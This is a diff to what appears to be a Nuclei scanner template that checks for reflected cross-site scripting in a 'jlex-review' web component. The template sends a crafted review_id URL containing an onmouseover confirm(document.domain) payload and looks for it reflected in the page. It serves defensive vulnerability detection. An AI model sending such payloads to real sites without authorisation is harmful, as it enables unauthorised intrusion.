@@ -19,14 +19,14 @@ info:
 http:
   - method: GET
     path:
-      - "{{BaseURL}}/?review_id=1&itwed%22onmouseover=%22confirm(document.domain)%22style=%22position:absolute%3bwidth:100%25%3bheight:100%25%3btop:0%3bleft:0%3b%22b7yzn=1"
+      - "{{BaseURL}}/?review_id=1&itwed%22onmouseover=%22confirm(document.domain)%22%22position:absolute%3bwidth:100%25%3bheight:100%25%3btop:0%3bleft:0%3b%22b7yzn=1"
 
     matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
-          - '<a href="/?itwed"onmouseover="confirm(document.domain)"style='
+          - '<a href="/?itwed"onmouseover="confirm(document.domain)"'
           - 'jlex-review'
         condition: and
 
